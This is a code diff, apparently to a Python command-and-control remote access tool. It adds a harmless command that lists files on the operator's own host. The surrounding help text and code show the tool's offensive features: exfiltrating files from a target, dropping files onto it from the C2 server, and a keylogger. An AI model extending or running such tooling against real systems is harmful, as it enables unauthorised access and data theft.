@@ -178,6 +178,8 @@ del <file> (windows)          :    To remove files
 clear / cls (linux/windows)   :    To clear terminal/cmd
 (Can be used interchangeably)
 
+ls_h                          :    List files in host's present working directory
+
 take <file> (linux/windows)   :    To exfiltrate file from trgt
 
 drop <file> (linux/windows)   :    To infiltrate file from C2 server to trgt
@@ -279,6 +281,13 @@ You can also use other commands related to networking, etc for linux as well as 
 			trgt.settimeout(None)
 			file.close()
 			counter += 1
+
+
+
+		# list files in host's pwd directory  ✓
+		elif cmd[:4] == "ls_h" and len(cmd) > 1:
+
+			os.system("dir")
 
 
                 # keylogger on
